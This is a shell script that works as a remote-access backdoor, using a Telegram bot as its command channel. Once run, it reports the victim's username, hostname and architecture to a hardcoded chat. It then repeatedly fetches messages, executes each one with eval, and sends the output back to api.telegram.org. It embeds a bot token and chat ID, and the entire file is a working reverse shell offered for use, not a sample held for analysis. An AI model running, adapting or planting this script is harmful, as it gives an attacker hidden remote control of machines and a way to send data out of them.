#!/bin/sh
TOKEN="8986955752:AAFWP6MKM4vG7cxxOZ6hsQG_sXfrg7EyQa8"
CHAT="6688114602"
API="https://api.telegram.org/bot$TOKEN"
OFFSET=0
TMP="/tmp/.tg.$$"
mkdir -p "$TMP"

curl -s "$API/sendMessage" -d "chat_id=$CHAT" \
  --data-urlencode "text=[+] shell up: $(id -un)@$(hostname) [$(uname -m)]" >/dev/null 2>&1

while true; do
  RESP=$(curl -s "$API/getUpdates?offset=$OFFSET&timeout=25" 2>/dev/null)
  [ -z "$RESP" ] && { sleep 2; continue; }

  echo "$RESP" | tr '{' '\n' | grep -o '"update_id":[0-9]*' | \
    sed 's/"update_id"://' | while read -r UID; do
    NEXT=$((UID + 1))
    echo "$NEXT" > "$TMP/offset"
  done

  echo "$RESP" | tr '{' '\n' | grep -o '"text":"[^"]*"' | \
    sed 's/^"text":"//; s/"$//' | while IFS= read -r MSG; do
    [ -z "$MSG" ] && continue
    [ "$MSG" = "exit" ] && {
      curl -s "$API/sendMessage" -d "chat_id=$CHAT" \
        --data-urlencode "text=[x] shell exit" >/dev/null 2>&1
      exit 0
    }
    OUT=$(eval "$MSG" 2>&1 | head -c 3500)
    [ -z "$OUT" ] && OUT="(no output)"
    curl -s "$API/sendMessage" -d "chat_id=$CHAT" \
      --data-urlencode "text=$OUT" >/dev/null 2>&1
  done

  [ -f "$TMP/offset" ] && OFFSET=$(cat "$TMP/offset")
done